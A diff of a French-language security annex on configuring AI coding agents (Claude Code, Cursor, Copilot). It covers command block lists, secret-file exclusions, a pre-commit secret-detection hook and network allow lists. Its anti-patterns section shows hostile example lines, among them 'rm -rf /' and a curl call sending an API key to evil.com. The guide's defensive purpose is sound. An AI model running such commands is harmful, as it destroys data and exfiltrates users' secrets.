@@ -2,24 +2,42 @@
 
 ## Pourquoi cette annexe ?
 
-Cette annexe définit les droits et accès à configurer pour les agents IA afin d'assurer sécurité et productivité.
+Les agents IA ont accès à votre code, vos commandes, et potentiellement vos secrets. Sans configuration stricte des permissions, un prompt mal formulé peut exposer des credentials, supprimer des fichiers, ou exécuter du code malveillant. Cette annexe vous guide pas à pas pour sécuriser l'accès des agents tout en maintenant leur productivité.
 
 ---
 
-## Principes de Base
+## Principes Fondamentaux
 
-### Principe du Moindre Privilège
+### Le Moindre Privilège
 
-Les agents IA ne doivent avoir que les accès nécessaires à leur fonctionnement.
+Chaque agent ne doit avoir que les accès **strictement nécessaires** à son fonctionnement.
 
-| Accès | Niveau Recommandé |
-|-------|-------------------|
-| Lecture code source | ✅ Complet |
-| Écriture code source | ✅ Complet (dans le projet) |
-| Exécution commandes | ⚠️ Limité (liste blanche) |
-| Accès réseau | ⚠️ Limité (API documentées) |
-| Accès fichiers système | ❌ Aucun |
-| Accès secrets | ❌ Aucun direct |
+| Type d'Accès | Recommandation | Justification |
+|--------------|----------------|---------------|
+| Lecture code source | ✅ Complet | Nécessaire pour comprendre le contexte |
+| Écriture code source | ✅ Dans le projet | Nécessaire pour générer du code |
+| Exécution commandes | ⚠️ Liste blanche | Risque d'exécution de code malveillant |
+| Accès réseau | ⚠️ Limité | Risque d'exfiltration de données |
+| Fichiers système | ❌ Aucun | Aucune raison légitime |
+| Secrets directs | ❌ Aucun | Exposition critique |
+
+### Défense en Profondeur
+
+```
+┌─────────────────────────────────────────────────────────┐
+│  Couche 1 : Configuration Agent                         │
+│  → Fichiers ignorés, commandes bloquées                 │
+├─────────────────────────────────────────────────────────┤
+│  Couche 2 : Git Hooks                                   │
+│  → Pre-commit : scan secrets, fichiers interdits        │
+├─────────────────────────────────────────────────────────┤
+│  Couche 3 : CI/CD                                       │
+│  → Audit dépendances, scan secrets, tests sécurité      │
+├─────────────────────────────────────────────────────────┤
+│  Couche 4 : Environnement                               │
+│  → Secrets Manager, variables d'environnement           │
+└─────────────────────────────────────────────────────────┘
+```
 
 ---
 
@@ -27,37 +45,36 @@ Les agents IA ne doivent avoir que les accès nécessaires à leur fonctionnemen
 
 ### Claude Code
 
-```bash
-# Permissions Claude Code sont configurées via les settings
+Claude Code utilise un système de permissions interactif. Configurez les préférences de sécurité :
 
-# Commandes autorisées (exemple)
-# ~/.claude-code/allowed-commands.json
-{
-  "allowedCommands": [
-    "pnpm",
-    "npm",
-    "yarn",
-    "git status",
-    "git diff",
-    "git log",
-    "ls",
-    "cat",
-    "grep"
-  ],
-  "blockedCommands": [
-    "rm -rf",
-    "sudo",
-    "chmod",
-    "curl",  // Sauf domaines autorisés
-    "wget"
-  ],
-  "requireConfirmation": [
-    "git push",
-    "git commit",
-    "pnpm install",
-    "npm install"
-  ]
-}
+```markdown
+# CLAUDE.md - Section Sécurité
+
+## Permissions
+
+### Commandes Autorisées
+- pnpm / npm / yarn (gestion de dépendances)
+- git status / git diff / git log (lecture)
+- ls / cat / grep (exploration)
+- pnpm test / pnpm build / pnpm lint (qualité)
+
+### Commandes avec Confirmation
+- git commit / git push (modifications git)
+- pnpm install / npm install (installation)
+- rm (suppression de fichiers)
+
+### Commandes Interdites
+- sudo (élévation de privilèges)
+- curl / wget vers des URLs externes
+- chmod / chown (permissions système)
+- Toute commande avec credentials en argument
+
+### Fichiers Interdits
+Ne jamais lire, modifier ou afficher :
+- .env, .env.* (sauf .env.example)
+- *.pem, *.key, *.p12
+- credentials.json, service-account.json
+- secrets/, .secrets/
 ```
 
 ### Cursor
@@ -69,20 +86,39 @@ Les agents IA ne doivent avoir que les accès nécessaires à leur fonctionnemen
     "allowedFilePatterns": [
       "src/**/*",
       "tests/**/*",
-      "docs/**/*"
+      "docs/**/*",
+      "public/**/*"
     ],
     "blockedFilePatterns": [
       ".env*",
+      "!.env.example",
       "*.pem",
       "*.key",
-      "**/secrets/**"
+      "*.p12",
+      "**/secrets/**",
+      "**/credentials*"
     ],
-    "allowTerminal": true,
-    "terminalAllowedCommands": [
-      "pnpm *",
-      "npm run *",
-      "git *"
-    ]
+    "terminal": {
+      "enabled": true,
+      "allowedCommands": [
+        "pnpm *",
+        "npm run *",
+        "git status",
+        "git diff",
+        "git log"
+      ],
+      "blockedCommands": [
+        "sudo *",
+        "rm -rf *",
+        "curl *",
+        "wget *"
+      ],
+      "requireConfirmation": [
+        "git commit",
+        "git push",
+        "pnpm install"
+      ]
+    }
   }
 }
 ```
@@ -92,13 +128,17 @@ Les agents IA ne doivent avoir que les accès nécessaires à leur fonctionnemen
 ```json
 // .github/copilot-settings.json
 {
-  "excludePatterns": [
-    "**/.env*",
-    "**/secrets/**",
-    "**/*.pem",
-    "**/*.key",
-    "**/credentials*"
-  ]
+  "content": {
+    "excludePatterns": [
+      "**/.env*",
+      "!**/.env.example",
+      "**/secrets/**",
+      "**/*.pem",
+      "**/*.key",
+      "**/credentials*",
+      "**/service-account*"
+    ]
+  }
 }
 ```
 
@@ -106,91 +146,163 @@ Les agents IA ne doivent avoir que les accès nécessaires à leur fonctionnemen
 
 ## Gestion des Secrets
 
-### Ne Jamais Exposer aux Agents
-
-```markdown
-## Fichiers à Exclure
-
-### Variables d'environnement
-- .env
-- .env.local
-- .env.production
-
-### Credentials
-- *.pem
-- *.key
-- *.p12
-- credentials.json
-- service-account.json
-
-### Configuration sensible
-- secrets/
-- .secrets/
-- config/production.json (si contient des secrets)
-```
-
-### Configuration .gitignore + Agent Ignore
+### Fichiers à Exclure Systématiquement
 
 ```gitignore
-# .gitignore ET .cursorignore / .claude-code-ignore
+# .gitignore ET fichiers d'exclusion des agents
 
-# Secrets
-.env*
-!.env.example
+# Variables d'environnement
+.env
+.env.local
+.env.development.local
+.env.test.local
+.env.production.local
+.env.production
+
+# Certificats et clés
 *.pem
 *.key
-secrets/
+*.p12
+*.pfx
+*.crt
 
 # Credentials
+credentials.json
 credentials*.json
+service-account.json
 service-account*.json
+
+# Dossiers secrets
+secrets/
+.secrets/
+private/
+
+# IDE et éditeurs (peuvent contenir des tokens)
+.idea/
+.vscode/settings.json
 ```
 
-### Utilisation de Variables d'Environnement
+### Template .env.example
+
+```bash
+# .env.example
+# Ce fichier est versionné et sert de template
+# Copiez-le vers .env et remplissez les vraies valeurs
+
+# ============================================
+# Application
+# ============================================
+NODE_ENV=development
+PORT=3000
+
+# ============================================
+# Database
+# ============================================
+# Format: postgresql://user:password@host:port/database
+DATABASE_URL=postgresql://user:password@localhost:5432/mydb
+
+# ============================================
+# Authentication
+# ============================================
+# Générez avec: openssl rand -base64 32
+JWT_SECRET=CHANGE_ME_IN_PRODUCTION
+
+# ============================================
+# External APIs
+# ============================================
+# Obtenez votre clé sur https://example.com/api
+# EXTERNAL_API_KEY=your-api-key-here
+```
+
+### Bonnes Pratiques Code
 
 ```typescript
-// ✅ Bon : référencer les variables d'environnement
+// ✅ BON : Utiliser les variables d'environnement
 const apiKey = process.env.API_KEY
+if (!apiKey) {
+  throw new Error('API_KEY environment variable is required')
+}
 
-// ❌ Mauvais : hardcoder ou exposer
-const apiKey = "sk-..." // JAMAIS
+// ✅ BON : Valider la présence des secrets au démarrage
+function validateEnvironment() {
+  const required = ['DATABASE_URL', 'JWT_SECRET', 'API_KEY']
+  const missing = required.filter((key) => !process.env[key])
+  if (missing.length > 0) {
+    throw new Error(`Missing environment variables: ${missing.join(', ')}`)
+  }
+}
+
+// ❌ MAUVAIS : Hardcoder des secrets
+const apiKey = 'sk-real-api-key-here' // JAMAIS
+
+// ❌ MAUVAIS : Logger des secrets
+console.log('API Key:', process.env.API_KEY) // JAMAIS
+
+// ❌ MAUVAIS : Exposer des secrets dans les erreurs
+throw new Error(`Auth failed with key: ${apiKey}`) // JAMAIS
 ```
 
 ---
 
-## Permissions Système de Fichiers
+## Protection Git
 
-### Structure Recommandée
-
-```
-project/
-├── src/           # ✅ Lecture + Écriture
-├── tests/         # ✅ Lecture + Écriture
-├── docs/          # ✅ Lecture + Écriture
-├── public/        # ✅ Lecture + Écriture limitée
-├── scripts/       # ⚠️ Lecture seule
-├── .env           # ❌ Aucun accès
-├── secrets/       # ❌ Aucun accès
-└── node_modules/  # ✅ Lecture seule
-```
-
-### Implémentation avec Pre-commit Hooks
+### Pre-commit Hook Anti-Secrets
 
 ```bash
 #!/bin/bash
 # .husky/pre-commit
 
-# Vérifier qu'aucun secret n'est committé
-if git diff --cached --name-only | grep -E '\.env|\.pem|\.key|credentials'; then
-  echo "❌ Tentative de commit de fichiers sensibles détectée"
-  exit 1
-fi
+# Vérifier les fichiers sensibles
+SENSITIVE_FILES=".env credentials.json service-account.json *.pem *.key"
+
+for pattern in $SENSITIVE_FILES; do
+  if git diff --cached --name-only | grep -q "$pattern"; then
+    echo "❌ ERREUR: Tentative de commit d'un fichier sensible ($pattern)"
+    echo "   Retirez ce fichier du staging avec: git reset HEAD <fichier>"
+    exit 1
+  fi
+done
 
 # Vérifier les patterns de secrets dans le code
-if git diff --cached | grep -E 'sk-[a-zA-Z0-9]{20,}|AKIA[0-9A-Z]{16}'; then
-  echo "❌ Secret potentiel détecté dans le diff"
-  exit 1
-fi
+PATTERNS=(
+  'sk-[a-zA-Z0-9]{20,}'           # OpenAI API keys
+  'AKIA[0-9A-Z]{16}'              # AWS Access Key ID
+  'ghp_[a-zA-Z0-9]{36}'           # GitHub Personal Access Token
+  'glpat-[a-zA-Z0-9\-]{20}'       # GitLab Personal Access Token
+  'sk-ant-[a-zA-Z0-9\-]{20,}'     # Anthropic API keys
+)
+
+for pattern in "${PATTERNS[@]}"; do
+  if git diff --cached | grep -qE "$pattern"; then
+    echo "❌ ERREUR: Secret potentiel détecté dans les changements"
+    echo "   Pattern: $pattern"
+    echo "   Vérifiez vos modifications et retirez le secret"
+    exit 1
+  fi
+done
+
+echo "✅ Aucun secret détecté"
+```
+
+### Git-Secrets (Alternative)
+
+```bash
+# Installation
+brew install git-secrets  # macOS
+# ou
+pip install git-secrets   # Python
+
+# Configuration
+cd my-project
+git secrets --install
+git secrets --register-aws  # Patterns AWS
+
+# Ajouter des patterns personnalisés
+git secrets --add 'sk-[a-zA-Z0-9]{20,}'        # OpenAI
+git secrets --add 'sk-ant-[a-zA-Z0-9\-]{20,}'  # Anthropic
+
+# Vérifier l'historique
+git secrets --scan-history
 ```
 
 ---
@@ -200,195 +312,331 @@ fi
 ### Domaines Autorisés
 
 ```json
-// Configuration proxy/firewall pour les agents
+// Configuration réseau pour les agents
 {
-  "allowedDomains": [
-    "api.anthropic.com",
-    "api.openai.com",
-    "api.github.com",
-    "registry.npmjs.org",
-    "raw.githubusercontent.com"
-  ],
-  "blockedDomains": [
-    "*" // Tout sauf la liste blanche
-  ]
+  "network": {
+    "allowedDomains": [
+      // APIs des agents IA
+      "api.anthropic.com",
+      "api.openai.com",
+
+      // Registres de packages
+      "registry.npmjs.org",
+      "registry.yarnpkg.com",
+
+      // Documentation
+      "developer.mozilla.org",
+      "docs.github.com",
+
+      // APIs du projet (dev uniquement)
+      "localhost",
+      "127.0.0.1"
+    ],
+    "blockedDomains": [
+      // APIs de production
+      "api.production.example.com",
+      "admin.example.com",
+
+      // Services sensibles
+      "*.stripe.com",
+      "*.aws.amazon.com"
+    ]
+  }
 }
 ```
 
-### Accès API Externe
+### Règles d'Accès API
 
-```markdown
-## Règles d'Accès API
+| Type | Autorisé | Interdit |
+|------|----------|----------|
+| Documentation | MDN, DevDocs, APIs doc officielles | - |
+| Package registries | npm, PyPI | - |
+| APIs projet | localhost, staging | Production |
+| Services tiers | Avec token de dev | Avec credentials prod |
+| POST/PUT/DELETE | Après confirmation | Automatique |
 
-### Autorisé
-- APIs de documentation (MDN, devdocs)
-- Package registries (npm, pypi)
-- APIs du projet (avec tokens de dev)
+---
 
-### Interdit
-- APIs de production avec vraies données
-- Services de paiement
-- APIs admin/backoffice
+## Permissions Système de Fichiers
 
-### Avec Confirmation
-- APIs tierces non documentées
-- Endpoints POST/PUT/DELETE
+### Structure et Accès
+
+```
+project/
+├── src/                    # ✅ Lecture + Écriture
+├── tests/                  # ✅ Lecture + Écriture
+├── docs/                   # ✅ Lecture + Écriture
+├── public/                 # ✅ Lecture + Écriture limitée
+├── scripts/                # ⚠️ Lecture seule (exécution avec confirmation)
+├── node_modules/           # ✅ Lecture seule
+├── dist/                   # ✅ Lecture + Écriture (build output)
+├── .env                    # ❌ Aucun accès
+├── .env.example            # ✅ Lecture seule
+├── secrets/                # ❌ Aucun accès
+└── credentials.json        # ❌ Aucun accès
+```
+
+### Configuration d'Exclusion
+
+```
+# .claudeignore / .cursorignore
+# Fichiers ignorés par les agents
+
+# Secrets
+.env*
+!.env.example
+secrets/
+*.pem
+*.key
+credentials*.json
+
+# Build artifacts volumineux
+node_modules/
+dist/
+build/
+.next/
+
+# Cache
+.cache/
+.turbo/
+
+# Logs (peuvent contenir des données sensibles)
+*.log
+logs/
 ```
 
 ---
 
-## Audit et Logging
+## Audit et Monitoring
 
 ### Logging des Actions
 
 ```typescript
-// Exemple de middleware de logging pour les actions des agents
+// lib/agent-audit.ts
 interface AgentAction {
   timestamp: Date
-  agent: string
+  agent: 'claude' | 'cursor' | 'copilot' | 'aider'
   action: 'read' | 'write' | 'execute' | 'network'
   target: string
-  result: 'success' | 'blocked' | 'error'
+  user: string
+  result: 'allowed' | 'blocked' | 'confirmed'
   details?: string
 }
 
-function logAgentAction(action: AgentAction) {
-  console.log(JSON.stringify({
-    ...action,
-    timestamp: action.timestamp.toISOString()
-  }))
+const auditLog: AgentAction[] = []
 
-  // Alerter si action sensible
+export function logAction(action: AgentAction): void {
+  auditLog.push(action)
+
+  // Logger en console (dev)
+  console.log(
+    `[AUDIT] ${action.timestamp.toISOString()} ` +
+    `${action.agent} ${action.action} ${action.target}: ${action.result}`
+  )
+
+  // Alerter si action bloquée
   if (action.result === 'blocked') {
-    alertSecurityTeam(action)
+    console.warn(`⚠️ Action bloquée: ${action.details}`)
   }
+}
+
+// Export pour analyse
+export function getAuditReport(since?: Date): AgentAction[] {
+  if (!since) return auditLog
+  return auditLog.filter(a => a.timestamp >= since)
 }
 ```
 
 ### Revue Périodique
 
 ```markdown
-## Checklist Revue Permissions (Mensuelle)
+## Checklist Revue Sécurité Mensuelle
 
 ### Accès Fichiers
-- [ ] Patterns d'exclusion à jour
-- [ ] Pas de nouveaux fichiers sensibles non exclus
-- [ ] Permissions de dossiers correctes
+- [ ] Patterns d'exclusion toujours complets
+- [ ] Nouveaux fichiers sensibles ajoutés aux exclusions
+- [ ] Pas de secret dans l'historique git récent
 
 ### Commandes
 - [ ] Liste blanche toujours pertinente
 - [ ] Pas de nouvelle commande dangereuse autorisée
-- [ ] Commandes avec confirmation fonctionnent
+- [ ] Logs des commandes exécutées vérifiés
 
 ### Réseau
 - [ ] Domaines autorisés toujours nécessaires
-- [ ] Pas de nouveau domaine suspect
-- [ ] Logs réseau vérifiés
+- [ ] Pas de connexion vers des services non autorisés
+- [ ] Tokens d'API rotés si nécessaire
 
 ### Secrets
-- [ ] Rotation des clés API si nécessaire
+- [ ] .env.example à jour
 - [ ] Pas de secret exposé dans les logs
-- [ ] .env.example à jour (sans vrais secrets)
+- [ ] Variables d'environnement en production vérifiées
+
+### Actions
+- [ ] Revue des actions bloquées
+- [ ] Investigation des anomalies
+- [ ] Mise à jour des règles si nécessaire
 ```
 
 ---
 
-## Configuration par Environnement
+## Exemples Pratiques
 
-### Développement
+### Exemple 1 : Setup Sécurité Minimal
 
-```json
-{
-  "environment": "development",
-  "permissions": {
-    "fileSystem": {
-      "read": ["**/*"],
-      "write": ["src/**", "tests/**", "docs/**"],
-      "exclude": [".env*", "secrets/**"]
-    },
-    "commands": {
-      "allowed": ["*"],
-      "blocked": ["sudo", "rm -rf /"],
-      "requireConfirmation": []
-    },
-    "network": {
-      "allowed": ["*"],
-      "blocked": []
-    }
-  }
-}
+```bash
+# 1. Créer les fichiers d'exclusion
+cat > .gitignore << 'EOF'
+.env*
+!.env.example
+*.pem
+*.key
+secrets/
+credentials*.json
+node_modules/
+EOF
+
+# 2. Copier pour les agents
+cp .gitignore .claudeignore
+cp .gitignore .cursorignore
+
+# 3. Créer le pre-commit hook
+mkdir -p .husky
+cat > .husky/pre-commit << 'EOF'
+#!/bin/bash
+if git diff --cached --name-only | grep -E '\.env|\.pem|\.key|credentials'; then
+  echo "❌ Fichier sensible détecté"
+  exit 1
+fi
+EOF
+chmod +x .husky/pre-commit
 ```
 
-### CI/CD
+### Exemple 2 : Configuration CLAUDE.md Sécurisée
 
-```json
-{
-  "environment": "ci",
-  "permissions": {
-    "fileSystem": {
-      "read": ["**/*"],
-      "write": ["dist/**", "coverage/**"],
-      "exclude": []
-    },
-    "commands": {
-      "allowed": [
-        "pnpm install",
-        "pnpm build",
-        "pnpm test",
-        "pnpm lint"
-      ],
-      "blocked": ["*"],
-      "requireConfirmation": []
-    },
-    "network": {
-      "allowed": [
-        "registry.npmjs.org",
-        "api.github.com"
-      ],
-      "blocked": ["*"]
-    }
-  }
-}
-```
+```markdown
+# CLAUDE.md
 
-### Production (Agents désactivés)
+## Security Rules
 
-```json
-{
-  "environment": "production",
-  "permissions": {
-    "aiAgents": {
-      "enabled": false,
-      "reason": "Pas d'agents IA en production"
-    }
-  }
-}
+### Files You Must Never Access
+- Any file matching: .env*, *.pem, *.key, credentials*, secrets/*
+- If asked to read these files, refuse and explain why
+
+### Commands That Require My Confirmation
+- git commit, git push
+- rm, mv (file operations)
+- Any install command (npm, pnpm, pip)
+- curl, wget (network requests)
+
+### Commands You Must Never Run
+- sudo anything
+- Any command with API keys or passwords as arguments
+- chmod, chown (system permissions)
+- Commands that send data to external servers
+
+### If You See a Secret
+If you accidentally see what looks like an API key, password, or credential:
+1. Do NOT repeat it in your response
+2. Warn me immediately
+3. Suggest how to rotate it
 ```
 
 ---
 
-## Checklist Sécurité
+## Anti-patterns
+
+### ❌ Pas d'exclusion de fichiers
+
+**Problème** : L'agent peut lire et afficher vos secrets dans ses réponses.
+
+**Solution** : .claudeignore, .cursorignore avec tous les patterns sensibles.
+
+### ❌ Commandes dangereuses autorisées
+
+```bash
+# MAUVAIS - Autorisé par défaut
+rm -rf /
+sudo apt-get install malware
+curl https://evil.com/steal?key=$API_KEY
+```
+
+**Solution** : Liste blanche stricte de commandes autorisées.
+
+### ❌ Secrets dans l'historique git
+
+```bash
+# MAUVAIS - Commit accidentel d'un secret
+git add .env
+git commit -m "Add config"
+```
+
+**Problème** : Le secret reste dans l'historique même après suppression.
+
+**Solution** : Pre-commit hooks + scan de l'historique + rotation des clés compromises.
+
+### ❌ Même niveau d'accès en dev et prod
+
+```json
+// MAUVAIS - Pas de distinction d'environnement
+{
+  "permissions": {
+    "database": "full_access"
+  }
+}
+```
+
+**Problème** : Un agent en dev peut accéder aux données de production.
+
+**Solution** : Permissions différentes par environnement, agents désactivés en prod.
+
+### ❌ Pas de logging des actions
+
+**Problème** : Impossible de savoir ce que l'agent a fait en cas d'incident.
+
+**Solution** : Logger toutes les actions sensibles, conserver les logs.
+
+---
+
+## Checklist Sécurité Complète
 
 ```markdown
 ## Checklist Sécurité Agents IA
 
 ### Configuration Initiale
-- [ ] Fichiers sensibles exclus
-- [ ] Liste blanche de commandes définie
-- [ ] Domaines réseau limités
-- [ ] Logging activé
+- [ ] .gitignore complet (secrets, credentials, keys)
+- [ ] .claudeignore / .cursorignore créés
+- [ ] Pre-commit hooks installés
+- [ ] git-secrets ou équivalent configuré
 
-### Opérationnel
-- [ ] Pre-commit hooks en place
-- [ ] Scan de secrets dans CI
+### Gestion des Secrets
+- [ ] .env dans .gitignore
+- [ ] .env.example créé et versionné
+- [ ] Variables d'environnement documentées
+- [ ] Pas de secret hardcodé dans le code
+
+### Permissions Agents
+- [ ] Fichiers sensibles exclus
+- [ ] Commandes autorisées listées
+- [ ] Commandes dangereuses bloquées
+- [ ] Confirmation requise pour actions sensibles
+
+### Réseau
+- [ ] Domaines autorisés définis
+- [ ] Pas d'accès aux APIs de production
+- [ ] Tokens de dev séparés des tokens prod
+
+### Monitoring
+- [ ] Logging des actions activé
 - [ ] Revue périodique planifiée
+- [ ] Procédure d'incident documentée
 
 ### Réponse aux Incidents
-- [ ] Procédure de révocation d'accès
-- [ ] Contacts d'urgence définis
-- [ ] Logs conservés pour investigation
+- [ ] Procédure de révocation d'accès définie
+- [ ] Contacts d'urgence identifiés
+- [ ] Process de rotation des secrets connu
 ```
 
 ---
 
-*Retour aux [Annexes](../framework/08-annexes.md)*
+*Voir aussi : [G.2 Installation Agents IA](G2-installation-agents-ia.md) · [G.3 Setup CI/CD](G3-setup-ci-cd.md) · [H.3 Anti-patterns](H3-anti-patterns.md)*
